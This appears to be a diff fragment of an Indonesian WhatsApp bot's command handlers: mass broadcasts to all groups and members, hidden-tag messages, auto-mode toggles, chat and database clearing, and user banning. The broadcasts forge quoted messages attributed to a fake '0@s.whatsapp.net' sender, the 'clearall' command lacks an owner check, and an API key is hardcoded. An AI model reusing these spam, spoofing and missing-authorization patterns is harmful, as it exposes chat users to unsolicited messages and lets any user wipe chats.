+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							await xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
+						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							await xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
+						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							await xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+						}else if (isMedia && !dev.message.videoMessage || isQuotedAudio) {
+						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							await xdev.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+					} else {
+						for (let _ of anus) {
+							await sendBc(_.jid, ` *BROADCAST*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'),ohyeah)
+						}
+						await setReply(`Sukses mengirim Broadcast:\n${q}`)
+					}
+					break
+					
+					
+					
+					
+					case 'bcgc':
+					if (!isOwner && !dev.key.fromMe) return onlyOwner()
+					if (args.length < 1) return setReply('Teksnya?')
+					await setReply(`*Loading...*`)
+					anus = await xdev.chats.all().filter(v => v.jid.endsWith('g.us'))
+					let yesnih = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
+                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
+					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
+						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							await xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
+						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							await xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
+						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							await xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+						}else if (isMedia && !dev.message.videoMessage || isQuotedAudio) {
+						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							await xdev.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+					    } else {
+						for (let _ of anus) {
+							
+					    await sendBc(_.jid, ` *BROADCAST GROUP*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), yesnih)
+						} 
+						await setReply(`Sukses mengirim Broadcast:\n${q}`)
+					    }
+					   break
+					
+					case 'cuaca':
+			       if (!q) return setReply('Masukan Nama Daerah')
+                  await setReply('Searching...')
+	              axios.get(`https://api.xteam.xyz/cuaca?kota=${q}&APIKEY=MIMINETBOT`).then ((res) => {
+	 	         let hasil = `Cuaca Daerah *${q}*\n\nTempat : ${res.data.message.kota}\nAngin : ${res.data.message.angin}\nCuaca : ${res.data.message.cuaca}\nDeskripsi : ${res.data.message.deskripsi}\nKelembapan : ${res.data.message.kelembapan}\nSuhu : ${res.data.message.suhu}\nUdara : ${res.data.message.pressure}`
+                  setReply(hasil)
+	              })
+	             break
+					
+					case 'pcallmember':
+					case 'pcallmem':
+					case 'bcmember':
+					if(!isGroup) return setReply("Fitur hanya bisa di gunakan di dalam group")
+					if (!isOwner && !dev.key.fromMe) return onlyOwner()
+					if (args.length < 1) return setReply('Teksnya?')
+					await setReply(`*Loading...*`)
+					anus = await groupMembers
+					let ayey = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
+                    {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
+					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
+						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
+						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
+						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+						for (let _ of anus) {
+							xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
+						}
+						await setReply(`Sukses mengirim Broadcast ${q}`)
+					} else {
+						for (let _ of anus) {
+							await sendBc(_.jid, `*BROADCAST PRIVATE*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), ayey)
+						}
+						sendMess(`Sukses mengirim Broadcast:\n${q}`)
+					}
+					break
+           
+           
+           
+           
+           
+           
+           case 'sendhidetag':        
+	        if (args.length < 1) return setReply(`Penggunaan ${prefix}sendhidetag idgc|teks\nUntuk mendapatkan id gc ketik ${prefix}getidgc di group`)
+	        if(!q.includes("|")) return setReply(`Penggunaan ${prefix}sendhidetag idgc|teks\nUntuk mendapatkan id gc ketik ${prefix}getidgc di group`)
+		    if (args[0].startsWith('08')) return setReply('Maukin idgc goblok')
+            if (args[0].startsWith('+62')) return setReply('masukin idgc peak lu')
+		    var gc = body.slice(13)
+            var idgc = gc.split("|")[0];
+            var teks = gc.split("|")[1];
+			var group = await xdev.groupMetadata(idgc)
+			var member = group['participants']
+			var mem = []
+			member.map(async adm => {
+			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
+			})
+			var optionshidetag = {
+			text: teks,
+			contextInfo: { mentionedJid: mem },
+			quoted: dev
+			}
+			await xdev.sendMessage(idgc, optionshidetag, text)
+			await setReply(`Sukses mengirim hidetag`)
+			break
+			
+			
+			
+			
+			case 'autowelcome':
+		            if (!isOwner) return onlyOwner()
+					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+					if (autoWelcome === true) return setReply('Udah aktif kak')
+                    autoWelcome = true           
+                    let ih =`Mode auto welcome telah aktif kak`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+					 if (autoWelcome === false) return setReply('Udah off kak')
+                     autoWelcome = false         
+                     let eh =`Mode auto welcome telah di matikan`
+                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
+					}else if (!q) {
+                      sendButMessage(from, `MODE AUTO WELCOME`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}autowelcome on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}autowelcome off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+			
+			
+			
+           
+           
+           case 'autoread':
+		            if (!isOwner) return onlyOwner()
+					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+					if (autoread === true) return setReply('Udah aktif kak')
+                    autoread = true
+                    
+                    let ih =`Mode auto read telah aktif kak \nBot akan auto read saat di chat`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+					 if (autoread === false) return setReply('Udah off kak')
+                     autoread = false
+                    
+                     let eh =`Mode auto read telah di matikan`
+                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
+					}else if (!q) {
+                      sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}autoread on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}autoread off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+            case 'autoclearchat':
+            case 'autoclearall':
+            if (!isOwner) return onlyOwner()
+			if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+			if (AutoClearChat) return setReply('Udah aktif kak')
+            AutoClearChat = true
+            setReply("Sukses Activated auto clear all, semua pesan akan di hapus sehari sekali")
+            } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+        	if (!AutoClearChat) return setReply('Udah off kak')
+            AutoClearChat = false
+            setReply("Sukses Deactivated auto clear chat")
+            }
+            break
+     
+     
+     case 'autoreport':
+            if (!isOwner) return onlyOwner()
+			if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+			if (autoReport) return setReply('Udah aktif kak')
+            autoReport = true
+            setReply("Sukses activated auto report")
+            } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+        	if (!autoReport) return setReply('Udah off kak')
+            autoReport = false
+            setReply("Sukses deactibated auto auto report")
+            }
+            break
+     
+                 
+                 
+                 case 'autorespon':
+			       if (!isOwner) return onlyOwner()
+					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+					if (autorespon === true) return setReply('Udah aktif kak')
+                    autorespon = true
+                    let ih =`Mode auto respon telah aktif kak \nBot akan auto respon saat di chat`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+					 if (autorespon === false) return setReply('Udah off kak')
+                     autorespon = false
+                     let eh =`Mode auto respon telah di matikan`
+                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
+					}else if (!q) {
+                      sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}autorespon on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}autorespon off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+					
+					
+					case 'autovn':
+		            if (!isOwner) return onlyOwner()
+					if ((args[0]) === 'on' || (args[0]) === 'enable') {
+					if (autovn === true) return setReply('Udah aktif kak')
+                    autovn = true
+                    typing = false
+                    autosticker = false
+                    let ih =`Mode auto vn telah aktif kak \nBot akan auto voice saat di kasih perintah`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+					 if (autovn === false) return setReply('Udah off kak')
+                     autovn = false
+                     let eh =`Mode auto vn telah di matikan`
+                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
+					}else if (!q) {
+                      sendButMessage(from, `MODE AUTO VOICE NOTE`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}autovn on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}autovn off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+                 
+                 
+                 
+                 case 'autosticker':
+				    if (!isOwner) return onlyOwner()
+					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+					if (autosticker === true) return setReply('Udah aktif kak')
+                    autosticker = true
+                    autovn = false
+                    typing = false
+                    let ih =`Mode autosticker telah aktif kak`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+					 if (autosticker === false) return setReply('Udah off kak')
+                     autosticker = false
+                     let eh =`Mode autosticker telah di matikan`
+                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
+					}else if (!q) {
+                      sendButMessage(from, `MODE AUTOSTICKER`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}autosticker on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}autosticker off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+					
+                 case 'autotyping':
+					case 'typing':
+					if (!isOwner) return onlyOwner()
+					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+					if (typing === true) return setReply('Udah aktif kak')
+                    typing = true
+                    autovn = false
+                    autosticker = false
+                    let ah =`Mode typing telah aktif kak \nBot akan auto typing saat di beri perintah`
+                    xdev.sendMessage(from, ah, text, { quoted: setQuoted, contextInfo: forward})
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+					 if (typing === false) return setReply('Udah off kak')
+                     typing = false
+                     let uh =`Mode typing telah di matikan`
+                     xdev.sendMessage(from, uh, text, { quoted: setQuoted, contextInfo: forward})
+					} else if (!q) {
+                      sendButMessage(from, `MODE AUTO TYPING`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}autotyping on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}autotyping off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 
+                 case 'autoblockcmd':
+		            if (!isOwner) return onlyOwner()
+					if ((args[0]) === 'on' || (args[0]) === 'enable') {
+					if (autoblockcmd === true) return setReply('Udah aktif kak')
+                    autoblockcmd = true          
+                    let ih =`Mode auto block command telah aktif kak \nBot akan auto block saat ada command yang error`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+					 if (autoblockcmd === false) return setReply('Udah off kak')
+                     autoblockcmd = false
+                     let eh =`Mode auto block command telah di matikan`
+                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
+					}else if (!q) {
+                      sendButMessage(from, `MODE AUTO BLOCK CMD`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}autoblockcmd on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}autoblockcmd off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+                 
+                 
+                 case 'autobio':
+			       if (!isOwner) return onlyOwner()
+					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+					if (autobio) return setReply('Udah aktif kak')
+                    autobio = true          
+                    let ih =`Mode auto bio telah aktif kak`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+					 if (!autobio) return setReply('Udah off kak')
+                     autobio = false
+                     let eh =`Mode auto bio telah di matikan`
+                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
+					}else if (!q) {
+                      sendButMessage(from, `MODE AUTO BIO`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}autobio on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}autobio off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+                 
+                 
+                 
+                 
+                 
+           
+      case 'unblockcmd':
+      case 'delblock':
+      case 'delblockcmd':
+      try{
+    	  if (!isOwner) return onlyOwner()
+          if(!q) return setReply("Textnya mana cih")
+          if (!checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
+          deleteblockcmd(q, listcmdblock)        
+          setReply(`Berhasil unblock command 「 *${q}* 」`)
+          } catch (err) {
+          	setReply("Bjirr error, keknya ada yang error")
+          }
+      break  
+            
+case 'blockcmd':
+if (!isOwner) return onlyOwner()
+if(!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
+if (checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
+addblockcmd(q,listcmdblock)         
+setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)          
+break
+            
+            
+            
+            
+                  
+           case 'listblockcmd':
+           case 'listcmdblock':
+let wo = `*「 LIST BLOCK CMD 」*`
+let soso = [];
+for (let i of listcmdblock) {
+soso.push(i.cmd)
+wo += `\n\n•> Command : ${i.cmd}`
+}
+mentions(wo, soso, true)
+break
+            
+case 'clearall1':
+try{
+					if (!isOwner) return onlyOwner()
+					let chiit = await xdev.chats.all()
+					await xdev.setMaxListeners(25)
+                    for (let _ of chiit){
+                   // xdev.modifyChat(i.jid, ChatModification.delete)       
+          await xdev.modifyChat(_.jid, 'clear', { includeStarred: false })
+                    }
+                   // await setReply("Sukses Clear All Chat")
+                    } catch (err){
+                	setReply(`${err}`)
+                    }
+					break
+
+case 'clearall':{
+let chats = xdev.chats.all().map(chat => chat.jid)
+for (let id of chats) {
+await xdev.modifyChat(id, 'delete').catch(console.log)
+ }
+ setReply(`Sukses delete All chat `)
+ }
+break
+
+
+case 'readall':
+if (!isOwner) return onlyOwner()
+let readall = await xdev.chats.all()
+for (let i of readall){
+await xdev.chatRead(i.jid, "read")
+}
+setReply(`Berhasil membaca ${readall.length} pesan`)
+break
+
+
+case 'clearallgc':
+try{ 
+var clearpc = await xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
+clearpc.map( async ({ jid }) => {
+ await xdev.modifyChat(jid, ChatModification.delete).catch(console.log)          
+})
+await setReply(`Succes Clear All ${clearpc.length} Group Chat`)
+} catch (err){
+setReply(`${err}`)
+}
+break
+	
+	
+	
+case 'clearallpc':
+try{ 
+var cleargc = await xdev.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
+cleargc.map( async ({ jid }) => {
+await xdev.modifyChat(jid, ChatModification.delete)                
+})
+//await setReply(`Succes Clear All ${cleargc.length} Private Chat`)
+} catch (err){
+setReply(`${err}`)
+}
+break
+
+
+
+           
+                    
+case 'delallerror':
+case 'clearallerror':
+				         if (!isOwner) return onlyOwner()
+				         var obj = [] 
+                         fs.writeFileSync('./database/listerror.json', JSON.stringify(obj))         
+				         await setReply(`ALL ERROR BERHASIL DI HAPUS`)
+			             break 
+	
+	case 'delalluser':
+	case 'clearalluser':
+				         if (!isOwner) return onlyOwner()
+				         var obj = [] 
+                         fs.writeFileSync('./database/user.json', JSON.stringify(obj))         
+				         await setReply(`ALL USER BERHASIL DI HAPUS`)
+			             break 
+			
+			
+			case 'delallblock':
+	case 'clearallblock':
+				         if (!isOwner) return onlyOwner()
+				         var obj = [] 
+                         fs.writeFileSync('./database/userblocked.json', JSON.stringify(obj))         
+				         await setReply(`ALL BLOCK BERHASIL DI HAPUS`)
+			             break 
+
+			
+			
+			
+			case 'delallban':
+	case 'clearallban':
+	case 'clearallbanned':
+				         if (!isOwner) return onlyOwner()
+				
+				setReply("Suksek clear all ban")
+				clearAllBan(ban)
+			             break 
+			
+case 'clearalldb':
+if (!isOwner) return onlyOwner()
+clearAllDb(Dashboard)
+setReply("Suksek clear all dashboard")
+break
+			
+			            
+           
+           case 'public':
+               if (!isOwner) return onlyOwner()
+
+           if (publik === true) return setReply('Udah di mode publick kak')
+           publik = true
+           let bab =`Mode public aktif kak`
+           xdev.sendMessage(from, bab, text, { quoted: setQuoted, contextInfo: forward})
+           break
+           
+case 'self':
+                 if (!isOwner) return onlyOwner()
+
+           if (publik === false) return setReply('Udah di mode self kak')
+           publik = false
+           let breh =`Mode self aktif kak`
+           xdev.sendMessage(from, breh, text, { quoted: setQuoted, contextInfo: forward})
+           break
+           
+           
+            
+           
+           
+           case 'setppbot':
+					if (!isOwner) return onlyOwner() 
+					if (!isQuotedImage) return setReply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
+					if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply gambarnya aja om')
+					enmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
+					media = await xdev.downloadAndSaveMediaMessage(enmedia)
+					await xdev.updateProfilePicture(botNumber, media)
+					await setReply('Makasih profil barunya😗')
+					fs.unlinkSync(media)
+					break
+           
+           
+           
+           
+           case 'setprefix':
+           case 'setpref':
+                     if (!isOwner) return onlyOwner()
+teks =`SETTING PREFIX\n\nSilakan masukkan prefix\nOptions :\n=> multi\n=> nopref\n=> allpref`
+                if (c === 'multi'){
+                    multi = true
+                    nopref = false
+                    setReply(`Berhasil mengubah prefix ke *「 ${c} 」*`)
+                } else if (c === 'nopref'){
+                	multi = false
+                    nopref = true
+                    setReply(`Berhasil mengubah prefix ke *「 ${c} 」*`)
+                } else if (c === 'allpref'){
+                	multi = false
+                    nopref = false
+                    allpref = true
+                    setReply(`Berhasil mengubah prefix ke *「 ${c} 」*`)
+                } else {
+                    multi = false
+                    nopref = false
+                    prefa = `${c}`
+                    setReply(`Berhasil mengubah prefix ke *「 ${c} 」*`)
+                } if (!q) {
+sendButMessage(from, teks, [
+{buttonId: `${prefix}setreply web`, buttonText: {displayText: `ᴡᴇʙ`},type: 1},
+{buttonId: `${prefix}setreply troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
+{buttonId: `${prefix}setreply mess`, buttonText: { displayText: `ᴍᴇss`},type: 1}]);
+ } 
+                break
+                
+           
+           case 'addrespon':{
+         if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
+          if (args.length < 1) return setReply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
+          let input1 = body.slice(11)
+          if (!input1.includes('|')) return setReply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
+          let input = input1.split("|")
+          if (checkCommands(input[0], commandsDB) === true) return setReply(`Command tersebut sudah ada`)
+          addCommands(input[0], input[1], sender, commandsDB) 
+          setReply(`Key : ${input[0]}\nRespon : ${input[1]}\n\nRespon berhasil di set`)
+          }
+      break
+      
+      case 'dellrespon':
+      case 'delrespon':{
+          if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
+            if (args.length < 1) return setReply(`Penggunaan ${prefix}delrespon key\n\nContoh : ${prefix}delrespon hai`)
+          if (!checkCommands(q, commandsDB)) return setReply(`Key tersebut tidak ada di database`)
+          deleteCommands(q, commandsDB)
+          setReply(`Berhasil menghapus respon dengan key ${q}`)
+          }
+      break
+      
+      
+      
+      
+  
+      
+      
+           
+		case 'ban':
+		case 'banned':
+		    if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
+			if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply atau tag targetnya')
+			          
+		    mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
+		    if (mentioned.length > 1) return reply ('Satu satu dong wuuuuuuuuuuu')
+            if (mentioned.length < 1) {
+            asu = dev.message.extendedTextMessage.contextInfo.participant
+           nama = xdev.contacts[asu] != undefined ? xdev.contacts[asu].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[asu].notify || xdev.contacts[asu].vname : PhoneNumber('+' + asu.replace('@s.whatsapp.net', '')).getNumber('international')
+            Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
+            if(cekBannedUser (asu, ban)) return setReply("Udah di ban kak")
+            if(Nomer === ownerNumber[0]) return setReply("Ga mau")
+            addBanned(nama,calender,  Nomer, ban)               
+            setReply( `*Asik si beban* @${asu.split("@")[0]} *kena banned* 🤣`);
+            } else {
+       	 if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
+            if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa banned Owner`)
+            if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa banned owner group`)
+            nama = xdev.contacts[mentioned] != undefined ? xdev.contacts[mentioned].notify = undefined ? PhoneNumber('+' + mentioned.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[mentioned].notify || xdev.contacts[mentioned].vname : PhoneNumber('+' + mentioned.replace('@s.whatsapp.net', '')).getNumber('international')
